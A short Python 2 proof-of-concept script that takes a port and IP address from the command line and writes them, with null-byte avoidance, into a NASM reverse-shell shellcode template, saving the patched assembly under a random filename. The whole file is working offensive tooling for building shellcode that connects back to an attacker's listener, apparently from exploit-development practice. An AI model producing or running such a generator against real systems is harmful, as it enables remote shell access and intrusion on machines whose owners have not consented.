#!/usr/bin/python

import uuid
import sys
import os

#clear the console
os.system('clear')

if len(sys.argv) != 3:
   
    print "[x] usage: ./poc.py port ipaddress (ex. 4444 10.0.7.17)"
    sys.exit(0)


with open('reverse-shell-template.nasm') as f:
    content = f.readlines()

# you may also want to remove whitespace characters like `\n` at the end of each line
content = [x.strip() for x in content] 

insertAt = content.index(";ip-address-before-here")

stuff = sys.argv[2].split('.')

offset = 0

for x in stuff[::-1]:
    if x != '0':
        instruction = "mov byte [esp+" + str(offset) + "], 0x" + str(format(int(x), '02x'))
        content.insert(insertAt, instruction)
        insertAt += 1
    offset += 1

insertAt = content.index(";port-before-here")

#push word 0x5C11     ; port number (least significant byte first ... 0x115C is 4444)

stuff = str(format(int(sys.argv[1]), '04x'))

finalPort = "0x"

if stuff[2:] != '00':
    finalPort += str(stuff[2:])

finalPort += str(stuff[:2])

finalPort = "mov word [esp], " + finalPort

content.insert(insertAt, finalPort)

uuidFileName = str(uuid.uuid4())

thefile = open(uuidFileName, 'w')
for x in content:
   thefile.write(x)
   thefile.write("\n")

thefile.close()

#os.remove(uuidFileName)

#print uuidFilePath

